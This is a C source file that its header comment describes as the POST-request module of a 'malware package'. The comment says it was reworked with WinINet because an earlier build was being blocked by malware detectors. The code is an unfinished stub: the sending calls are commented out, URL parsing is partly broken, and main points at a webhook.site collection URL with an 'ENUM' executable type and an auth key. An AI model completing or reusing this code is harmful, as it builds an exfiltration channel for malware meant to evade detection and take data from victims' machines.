/*
    This file handles all of the potential POST requests that will be sent out by our executables.

    While I originally wrote a version of this using libcurl, I ultimately scratched that and decided to use WiniINet since it's not
    "good" for a malware package to be EXTREMELY LARGE (which we had to have because static file).

    It's getting blocked by malware detectors. Hence, we have this
*/

#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>
#include <errno.h>
#include "winerror.h"

// typedef const wchar_t* LPCWSTR;
// Issue is we can't define wchar_t size because it's platform dependent

// gcc .\post.c -o post.exe -lwininet

int parse_url(char* address, URL_COMPONENTS* url_components)
{
    // Zero out the struct
    memset(url_components, 0, sizeof(*url_components));

    // Something they don't tell you in documentation - you're supposed to prepare a ton of stuff in url_components
    // That's because it turns out InternetCrackURL is annoying and merely REPLACES the fields
    // Unfortunately, we do have to malloc all of this
    wchar_t dummy;
    int wchar_t_size = sizeof(dummy);

    int LPZ_SCHEME_LEN = 8;
    int HOSTNAME_LEN = INTERNET_MAX_HOST_NAME_LENGTH;
    int URL_PATH_LEN = 256;
    int EXTRA_INFO_LEN = 64;

    url_components->lpszScheme = malloc(LPZ_SCHEME_LEN * wchar_t_size);
    url_components->dwSchemeLength = LPZ_SCHEME_LEN;
    url_components->lpszHostName = malloc(HOSTNAME_LEN * wchar_t_size);
    url_components->dwHostNameLength = HOSTNAME_LEN;
    url_components->lpszUrlPath = malloc(URL_PATH_LEN * wchar_t_size);
    url_components->dwUrlPathLength = URL_PATH_LEN;
    url_components->lpszExtraInfo = malloc(EXTRA_INFO_LEN * wchar_t_size);
    url_components->dwExtraInfoLength = EXTRA_INFO_LEN;
    url_components->dwStructSize = sizeof(*url_components);
    // url_components->dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;

    // I don't think URLs have Unicode. Hence, we're setting this to 0
    // This returns false if failed
    if (!InternetCrackUrl(address, 0, ICU_ESCAPE, url_components)) 
    {
        print_last_error("Parsing URL failed");
        return -1;
    }
}

void free_url_components(URL_COMPONENTS* url_components)
{
    free(url_components->lpszScheme);
    free(url_components->lpszHostName);
    free(url_components->lpszUrlPath);
    free(url_components->lpszExtraInfo);
}

int send_post_request(char* address, char* text, int text_size, char* exe_type, char* auth_key)
{
    // Before we do anything, parse the URL.
    URL_COMPONENTS url_components;
    parse_url(address, &url_components);

    puts(url_components.lpszHostName);
    free_url_components(&url_components);
    // Allow windows to access the internet. Use the 'W' version for unicode
    // Error handle for no internet
    // HINTERNET internet_connection = InternetOpen(
    //     "", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    // );

    // if (internet_connection == NULL)
    // {
    //     perror("Error when sending POST request");
    //     return -1;
    // }

    // Create a windows HTTP session
    // HINTERNET httpSession = InternetConnect(
    //     internet_connection,

    // );

    return 0;
}

int main()
{
    puts("hi");
    send_post_request("https://webhook.site/90b9688d-b73c-4048-8018-558a583b5cab", "Hello World!", 12, "ENUM", "HI");
    puts("Done!");
    return 0;
}